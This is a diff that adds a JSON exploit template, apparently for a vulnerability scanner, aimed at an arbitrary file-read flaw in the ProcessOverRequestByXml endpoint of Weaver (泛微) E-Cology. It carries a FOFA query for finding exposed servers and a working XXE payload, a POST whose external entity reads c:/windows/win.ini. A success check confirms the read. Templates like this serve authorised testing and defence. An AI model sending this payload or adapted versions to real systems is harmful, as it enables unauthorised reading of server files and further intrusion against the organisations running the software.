@@ -1,0 +1,34 @@
+{
+  "product": "泛微 E-Cology",
+  "vul_name": "泛微 E-Cology ProcessOverRequestByXml接口任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "泛微e-cology依托全新的设计理念,全新的管理思想。 为中大型组织创建全新的高效协同办公环境。 智能语音办公,简化软件操作界面。 身份认证、电子签名、电子签章、数据存证让合同全程数字化。泛微e-cology ProcessOverRequestByXml接口存在任意文件读取漏洞\n\n",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"/js/ecology8\" || body=\"wui/common/css/w7OVFont_wev8.css\" || (body=\"weaver\" && body=\"ecology\") || (header=\"ecology_JSessionId\" && body=\"login/Login.jsp\") || body=\"/wui/index.html\" || body=\"jquery_wev8\" && body=\"/login/Login.jsp?logintype=1\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486150&idx=1&sn=9b0138cc0cb06187b6dc752daa33774a&chksm=974b87c1a03c0ed75d1bc10246fb12f5f72a8901dec2ec3579988da10c5dcf4fe61edad0f46e&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/rest/ofs/ProcessOverRequestByXml",
+      "data": "<?xml version=\"1.0\" encoding=\"utf-8\" ?><!DOCTYPE test[<!ENTITY test SYSTEM \"file:///c:/windows/win.ini\">]><reset><syscode>&test;</syscode></reset>"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "for 16-bit app support"
+        }
+      ]
+    }
+  }
+}
